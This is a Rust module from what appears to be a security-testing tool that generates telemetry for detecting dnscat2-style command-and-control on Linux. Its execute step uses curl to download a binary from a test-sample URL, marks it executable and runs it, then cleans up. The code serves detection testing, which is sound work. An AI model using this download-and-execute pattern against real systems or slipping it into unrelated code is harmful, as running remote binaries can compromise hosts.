// SIGNALBENCH - DNS C2 Technique
// Dnscat2 C2 Telemetry (T1059 - Command and Scripting Interpreter)
// 
// This module generates telemetry for C2 detection via dnscat2
// Developed by Simon Sigre (simon@gocortex.io)
// Part of the GoCortex.io platform for security testing and validation

use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, CleanupFuture, ExecuteFuture, SimulationResult, Technique, TechniqueParameter};
use async_trait::async_trait;
use std::fs::File;
use std::io::Write;
use std::path::Path;
use tokio::process::Command;
use log::{error, info};

// ======================================
// T1059 - Possible C2 via dnscat2
// ======================================
pub struct DnscatC2Test {}

#[async_trait]
impl AttackTechnique for DnscatC2Test {
    fn info(&self) -> Technique {
        Technique {
            id: "T1059".to_string(),
            name: "Possible C2 via dnscat2".to_string(),
            description: "Generates telemetry for C2 communications via dnscat2-style activities".to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            detection: "Monitor for unexpected binary downloads and execution".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            parameters: vec![
                TechniqueParameter {
                    name: "download_url".to_string(),
                    description: "URL to download the dnscat2 test binary".to_string(),
                    required: false,
                    default: Some("https://wildfire.paloaltonetworks.com/publicapi/test/elf".to_string()),
                },
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory to save execution artifacts".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_dnscat2".to_string()),
                },
            ],
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        let output_dir = config
            .parameters
            .get("output_dir")
            .unwrap_or(&"/tmp/signalbench_dnscat2".to_string())
            .clone();
            
        let download_url = config
            .parameters
            .get("download_url")
            .unwrap_or(&"https://wildfire.paloaltonetworks.com/publicapi/test/elf".to_string())
            .clone();
            
        Box::pin(async move {
            // Create output directory if it doesn't exist
            if !Path::new(&output_dir).exists() {
                std::fs::create_dir_all(&output_dir)
                    .map_err(|e| format!("Failed to create output directory: {e}"))?;
            }
            
            let output_file = format!("{output_dir}/dnscat2");
            
            if dry_run {
                info!("[DRY RUN] Would download file from {download_url} to {output_file}");
                info!("[DRY RUN] Would execute dnscat2 client to generate C2 telemetry");
                
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would download and execute dnscat2 client".to_string(),
                    artifacts: vec![output_file],
                    cleanup_required: false,
                });
            }
            
            // Download the file using curl
            info!("Downloading dnscat2 C2 test client from {download_url}");
            
            let curl_output = Command::new("curl")
                .arg("-s")
                .arg("-L")
                .arg(&download_url)
                .arg("-o")
                .arg(&output_file)
                .output()
                .await
                .map_err(|e| format!("Failed to download file with curl: {e}"))?;
                
            if !curl_output.status.success() {
                let stderr = String::from_utf8_lossy(&curl_output.stderr);
                return Err(format!("Failed to download file: {stderr}"));
            }
            
            info!("Successfully downloaded file to {output_file}");
                
            // Make the file executable
            std::fs::set_permissions(&output_file, std::os::unix::fs::PermissionsExt::from_mode(0o755))
                .map_err(|e| format!("Failed to set file permissions: {e}"))?;
                
            info!("Downloaded file to {output_file}");
            
            // Execute the file
            info!("Executing dnscat2 binary (simulation)");
            
            let output = Command::new(&output_file)
                .args(["--help"])
                .output()
                .await
                .map_err(|e| format!("Failed to execute file: {e}"))?;
                
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            
            // Log output for analysis
            let log_file = format!("{output_dir}/execution_log.txt");
            let mut log = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            writeln!(log, "=== Dnscat2 C2 Simulation Log ===")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
                
            writeln!(log, "Exit Code: {}", output.status.code().unwrap_or(-1))
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
                
            writeln!(log, "=== STDOUT ===\n{stdout}")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
                
            writeln!(log, "=== STDERR ===\n{stderr}")
                .map_err(|e| format!("Failed to write to log file: {e}"))?;
                
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: "Successfully downloaded and executed dnscat2 C2 client for telemetry generation".to_string(),
                artifacts: vec![output_file, log_file],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        let artifacts = artifacts.to_vec();
        
        Box::pin(async move {
            for artifact in &artifacts {
                if Path::new(artifact).exists() {
                    info!("Removing artifact: {artifact}");
                    
                    if let Err(e) = std::fs::remove_file(artifact) {
                        error!("Failed to remove artifact {artifact}: {e}");
                    }
                }
            }
            
            // Try to remove the directory if it's empty
            if !artifacts.is_empty() {
                if let Some(dir) = Path::new(&artifacts[0]).parent() {
                    if dir.exists() {
                        match std::fs::read_dir(dir) {
                            Ok(entries) => {
                                if entries.count() == 0 {
                                    if let Err(e) = std::fs::remove_dir(dir) {
                                        error!("Failed to remove directory {}: {}", dir.display(), e);
                                    }
                                }
                            }
                            Err(e) => error!("Failed to read directory {}: {}", dir.display(), e),
                        }
                    }
                }
            }
            
            Ok(())
        })
    }
}